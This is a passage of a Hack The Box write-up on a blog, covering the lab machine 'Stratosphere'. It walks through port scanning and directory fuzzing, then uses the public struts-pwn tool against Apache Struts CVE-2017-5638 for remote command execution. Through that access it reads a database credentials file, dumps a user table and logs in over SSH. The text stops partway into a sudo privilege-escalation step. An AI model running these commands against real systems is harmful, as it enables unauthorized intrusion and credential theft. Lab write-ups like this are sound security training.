<!DOCTYPE html>

<html>
<head>

<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://ktmtrk.github.io/posts/writeups/machinetest/" />
<link rel="stylesheet" href="https://ktmtrk.github.io/brand/nova.css" />


<meta name="description" content="Apache Struts Exploitation (CVE-2017-5638) Python Library Hijacking (Privilege Escalation) Index
IP:10.10.10.64 Name:Stratosphere Ports Web Fuzzing What is apache struts ? Library hail jacking Ports &amp;mdash; Enumeration &amp;mdash;
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.64 -oG allports 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 63 &amp;mdash; Service and Version &amp;mdash;
nmap -sCV -p22,80,8080 10.10.10.64 -oN targeted PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
<meta name="keywords" content="Book, Purchase, Sign up, Author, Download, PDF, Capitalism, Hacking, Tech Industry, Silicon Valley, San Francisco, Bay Area, Exploit, Career, Guide, Humans, Computers, Money, books, booktok, bookish, bookworm, bookrecs, fyp, book, foryou, bookstan"/>


<meta name="twitter:image" content="/images/console.png"/>
<meta name="twitter:card" content="summary">
<meta name="twitter:creator" content="lwn">
<meta name="twitter:site" content="">

<meta property="og:image" content="/images/console.png" />
<meta property="og:type" content="website" />
<meta property="og:url" content="Hacking" />
<meta property="og:site_name" content="" />


<meta name="twitter:title" content="Stratosphere - HTB WriteUp "/>
<meta name="twitter:description" content="Apache Struts Exploitation (CVE-2017-5638) Python Library Hijacking (Privilege Escalation) Index
IP:10.10.10.64 Name:Stratosphere Ports Web Fuzzing What is apache struts ? Library hail jacking Ports &amp;mdash; Enumeration &amp;mdash;
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.64 -oG allports 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 63 &amp;mdash; Service and Version &amp;mdash;
nmap -sCV -p22,80,8080 10.10.10.64 -oN targeted PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
<meta property="og:description" content="Book, Purchase, Sign up, Author, Download, PDF, Capitalism, Hacking, Tech Industry, Silicon Valley, San Francisco, Bay Area, Exploit, Career, Guide, Humans, Computers, Money, books, booktok, bookish, bookworm, bookrecs, fyp, book, foryou, bookstan"/>
<meta property="og:title" content="Stratosphere - HTB WriteUp " />


<title>

Hacking

</title>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-2N5YYN3BX6"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2N5YYN3BX6');
</script>
</head><body><header class="header glow">
  <span class="header-inner">
    <span class="logo glow" title="001">
    <a href="/" class="logo" style="text-decoration: none">
    <span class="color-highlight">[</span>
    <span class="color-alt">lwn</span>
    <span class="color-highlight">@</span>
    <span class="color-highlight">001</span>
    <span class="color-alt">]: </span>
    </a>
    
    <span class="color-highlight">  ~/machineTest</span>
    
    <span class="color-alt">$</span>
  <span class="logo-cursor"></span>
</span>
    <span class="header-right">
      
        <nav class="menu content-desktop">
    <ul class="menu-inner menu-inner--desktop">
        <li>./</li>
        
        <li><a href="../">../</a></li>
        
    </ul>
</nav>

      

      
      

      
      

      
      
      <a href="https://github.com/ktmtrk" title="ktmtrk" target="_blank" rel="noopener noreferrer" class="menu-icon">
        
<span class="content-fa"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span>

      </a>
      

      
      
      <a href="https://discord.com/users/lwn#1946" title="Send DM" target="_blank" rel="noopener noreferrer" class="menu-icon">
        
<span class="content-fa"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"/></svg>
</span>

      </a>
      

      
      



    </span>
  </span>
</header>
<div id="content">

  

    <div class="flex-row">
    <div class="content">

      <div class="content-container">


    <h1 class="content-h1">Stratosphere - HTB WriteUp</h1>
    <div class="content-meta">
          <div class="content-more">
          
          </div>
    </div>

    


    <div class="post-content">
      
      <hr>
<ul>
<li>Apache Struts Exploitation (CVE-2017-5638)</li>
<li>Python Library Hijacking (Privilege Escalation)</li>
</ul>
<hr>
<p><em><strong>Index</strong></em></p>
<ul>
<li>IP:10.10.10.64</li>
<li>Name:Stratosphere</li>
<li>Ports</li>
<li>Web</li>
<li>Fuzzing</li>
<li>What is apache struts ?</li>
<li>Library hail jacking</li>
</ul>
<hr>
<h2 id="ports">Ports</h2>
<p>&mdash; Enumeration &mdash;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.64 -oG allports
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>22/tcp   open  ssh        syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http       syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span></code></pre></div><p>&mdash; Service and Version &mdash;</p>
<pre tabindex="0"><code>nmap -sCV -p22,80,8080 10.10.10.64 -oN targeted

PORT     STATE SERVICE    VERSION

22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b1637d43c180415c402010ddb07ac2d (RSA)
|   256 e3777b2c23b08ddf38356c40abf68150 (ECDSA)
|_  256 d76b669c19fcaa666c187accb5870e40 (ED25519)

80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Wed, 22 Feb 2023 14:40:34 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 
|     Found&lt;/title&gt;&lt;style type=&#34;text

8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Stratosphere
</code></pre><hr>
<h2 id="web">WEB</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">whatweb</span> <span style="color:#a6e22e">http</span>:<span style="color:#75715e">//10.10.10.64
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">http</span>:<span style="color:#75715e">//10.10.10.64 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
</span></span></span></code></pre></div><p><strong>http://10.10.10.64/</strong></p>
<p><strong>http://10.10.10.64:8080</strong></p>
<p>In both we see the same content</p>
<p><img src="/htbImages/strato/img.002.stratosphere.png" alt="web"></p>
<hr>
<h2 id="fuzzing">Fuzzing</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /home/lio/herramientas/subdomains/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span> http://10.10.10.64/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>000004889:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;manager&#34;</span>                                                                              
</span></span><span style="display:flex;"><span>000013290:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">0</span> W        <span style="color:#ae81ff">0</span> Ch        <span style="color:#e6db74">&#34;Monitoring
</span></span></span></code></pre></div><p><em><strong>/manager</strong></em> asks us for credentials</p>
<p><em><strong>/Monitoring</strong></em> redirects us to the following URL</p>
<p>http://10.10.10.64/Monitoring/example/Welcome.action</p>
<p><img src="/htbImages/strato/img.001.stratosphere.png" alt="web"></p>
<p>It is curious the extension of the route <em><strong>Welcome.action</strong></em>
Find on google : <em><strong>.action exploit</strong></em></p>
<p><a href="https://github.com/mazen160/struts-pwn">https://github.com/mazen160/struts-pwn</a>
The first result comments on <em><strong>apache-struts</strong></em></p>
<h2 id="what-is-apache-struts-">What is apache struts ?</h2>
<p>Struts is a support tool for the development of Web applications of the MVC pattern under the Java EE platform. Struts was developed as part of the Jakarta project of the Apache Software Foundation, but nowadays it is a project known as Apache Struts. Struts allows to reduce development time</p>
<p>Copy the repository</p>
<pre tabindex="0"><code class="language-git" data-lang="git">git clone https://github.com/mazen160/struts-pwn.git
</code></pre><p>Run</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 struts-pwn.py -u <span style="color:#e6db74">&#39;http://10.10.10.64/Monitoring/example/Welcome.action&#39;</span> -c <span style="color:#e6db74">&#39;id&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> URL: http://10.10.10.64/Monitoring/example/Welcome.action
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CMD: id
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ChunkedEncodingError Error: Making another request to the url.
</span></span><span style="display:flex;"><span>Refer to: https://github.com/mazen160/struts-pwn/issues/8 <span style="color:#66d9ef">for</span> help.
</span></span><span style="display:flex;"><span>EXCEPTION::::--&gt; <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection broken: InvalidChunkLength(got length b&#39;&#39;, 0 bytes read)&#34;</span>, InvalidChunkLength<span style="color:#f92672">(</span>got length b<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">0</span> bytes read<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>Note: Server Connection Closed Prematurely
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>115<span style="color:#f92672">(</span>tomcat8<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>119<span style="color:#f92672">(</span>tomcat8<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>119<span style="color:#f92672">(</span>tomcat8<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>%<span style="color:#f92672">]</span> Done.
</span></span></code></pre></div><p>We have Remote command execution
When executing a <em><strong>whoami</strong></em>, it tells us that we are the user <em><strong>tomcat8</strong></em>.</p>
<p><em><strong>curl</strong></em>, does not exist on the server
<em><strong>wget</strong></em>, when sending a request to our ip, we have no answer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 struts-pwn.py -u <span style="color:#e6db74">&#39;http://10.10.10.64/Monitoring/example/Welcome.action&#39;</span> -c <span style="color:#e6db74">&#39;ls -la&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> URL: http://10.10.10.64/Monitoring/example/Welcome.action
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CMD: ls -la
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ChunkedEncodingError Error: Making another request to the url.
</span></span><span style="display:flex;"><span>Refer to: https://github.com/mazen160/struts-pwn/issues/8 <span style="color:#66d9ef">for</span> help.
</span></span><span style="display:flex;"><span>EXCEPTION::::--&gt; <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection broken: InvalidChunkLength(got length b&#39;&#39;, 0 bytes read)&#34;</span>, 
</span></span><span style="display:flex;"><span>InvalidChunkLength<span style="color:#f92672">(</span>got length b<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">0</span> bytes read<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>Note: Server Connection Closed Prematurely
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> root    root    <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">22</span> 09:38 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">42</span> root    root    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2017</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root    root      <span style="color:#ae81ff">12</span> Sep  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2017</span> conf -&gt; /etc/tomcat8
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root    root      <span style="color:#ae81ff">68</span> Oct  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> db_connect
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> tomcat8 tomcat8 <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2017</span> lib
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root    root      <span style="color:#ae81ff">17</span> Sep  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2017</span> logs -&gt; ../../log/tomcat8
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root    root    <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">22</span> 09:38 policy
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">4</span> tomcat8 tomcat8 <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2018</span> webapps
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root    root      <span style="color:#ae81ff">19</span> Sep  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2017</span> work -&gt; ../../cache/tomcat8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>%<span style="color:#f92672">]</span> Done.****
</span></span></code></pre></div><p>We see a file <em><strong>db_connect</strong></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 struts<span style="color:#f92672">-</span>pwn<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;http://10.10.10.64/Monitoring/example/Welcome.action&#39;</span> <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;cat db_connect&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[ssn]
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>ssn_admin
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pass</span><span style="color:#f92672">=</span>AWs64<span style="color:#a6e22e">@on</span><span style="color:#f92672">*&amp;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[users]
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>admin
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pass</span><span style="color:#f92672">=</span>admin
</span></span></code></pre></div><p>We use <em><strong>mysqlshow</strong></em>, in order to list the information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 struts-pwn.py -u <span style="color:#e6db74">&#39;http://10.10.10.64/Monitoring/example/Welcome.action&#39;</span> -c <span style="color:#e6db74">&#39;which mysqlshow&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/mysqlshow
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>python3 struts-pwn.py -u <span style="color:#e6db74">&#39;http://10.10.10.64/Monitoring/example/Welcome.action&#39;</span> -c <span style="color:#e6db74">&#39;mysqlshow -uadmin -padmin users accounts&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> URL: http://10.10.10.64/Monitoring/example/Welcome.action
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CMD: mysqlshow -uadmin -padmin users accounts
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ChunkedEncodingError Error: Making another request to the url.
</span></span><span style="display:flex;"><span>Refer to: https://github.com/mazen160/struts-pwn/issues/8 <span style="color:#66d9ef">for</span> help.
</span></span><span style="display:flex;"><span>EXCEPTION::::--&gt; <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection broken: InvalidChunkLength(got length b&#39;&#39;, 0 bytes read)&#34;</span>, InvalidChunkLength<span style="color:#f92672">(</span>got length b<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">0</span> bytes read<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>Note: Server Connection Closed Prematurely
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database: users  Table: accounts
</span></span><span style="display:flex;"><span>+----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
</span></span><span style="display:flex;"><span>| Field    | Type        | Collation          | Null | Key | Default | Extra | Privileges                      | Comment |
</span></span><span style="display:flex;"><span>+----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
</span></span><span style="display:flex;"><span>| fullName | varchar<span style="color:#f92672">(</span>45<span style="color:#f92672">)</span> | utf8mb4_general_ci | YES  |     |         |       | <span style="color:#66d9ef">select</span>,insert,update,references |         |
</span></span><span style="display:flex;"><span>| password | varchar<span style="color:#f92672">(</span>30<span style="color:#f92672">)</span> | utf8mb4_general_ci | YES  |     |         |       | <span style="color:#66d9ef">select</span>,insert,update,references |         |
</span></span><span style="display:flex;"><span>| username | varchar<span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> | utf8mb4_general_ci | YES  |     |         |       | <span style="color:#66d9ef">select</span>,insert,update,references |         |
</span></span><span style="display:flex;"><span>+----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
</span></span></code></pre></div><p>we can see the columns, <em><strong>username, password</strong></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 struts-pwn.py -u <span style="color:#e6db74">&#39;http://10.10.10.64/Monitoring/example/Welcome.action&#39;</span> -c <span style="color:#e6db74">&#39;mysql -uadmin -padmin -e &#34;select * from accounts&#34; users&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> URL: http://10.10.10.64/Monitoring/example/Welcome.action
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CMD: mysql -uadmin -padmin -e <span style="color:#e6db74">&#34;select * from accounts&#34;</span> users
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ChunkedEncodingError Error: Making another request to the url.
</span></span><span style="display:flex;"><span>Refer to: https://github.com/mazen160/struts-pwn/issues/8 <span style="color:#66d9ef">for</span> help.
</span></span><span style="display:flex;"><span>EXCEPTION::::--&gt; <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection broken: InvalidChunkLength(got length b&#39;&#39;, 0 bytes read)&#34;</span>, InvalidChunkLength<span style="color:#f92672">(</span>got length b<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">0</span> bytes read<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>Note: Server Connection Closed Prematurely
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fullName	        password	                username
</span></span><span style="display:flex;"><span>Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>%<span style="color:#f92672">]</span> Done.
</span></span></code></pre></div><p>By testing the credentials for <em><strong>ssh</strong></em> we were able to log in.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>richard@stratosphere:~$ whoami
</span></span><span style="display:flex;"><span>richard
</span></span></code></pre></div><hr>
<p>[Escalation Privilege]</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>richard@stratosphere:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> richard on stratosphere:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User richard may run the following commands on stratosphere:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python* /home/richard/test.py
</span></span></code></pre></div><p>We can run a python script as <em><strong>root</strong></em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rwxr-x--- <span style="color:#ae81ff">1</span> root richard <span style="color:#ae81ff">1507</span> Mar <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> /home/richard/test.py
</span></span></code></pre></div><p>It is not possible to alter the script, just run</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">question</span>():
</span></span><span style="display:flex;"><span>    q1 <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Solve: 5af003e100c80923ec04d65933d382cb</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5()
</span></span><span style="display:flex;"><span>    md5<span style="color:#f92672">.</span>update(q1<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> md5<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;5af003e100c80923ec04d65933d382cb&#34;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Sorry, that&#39;s not right&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;You got it!&#34;</span>)
</span></span><span style="display:flex;"><span>    q2 <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Now what&#39;s this one? d24f6fb449855ff42344feff18ee2819033529ff</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    sha1 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
</span></span><span style="display:flex;"><span>    sha1<span style="color:#f92672">.</span>update(q2<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> sha1<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;d24f6fb449855ff42344feff18ee2819033529ff&#39;</span>:
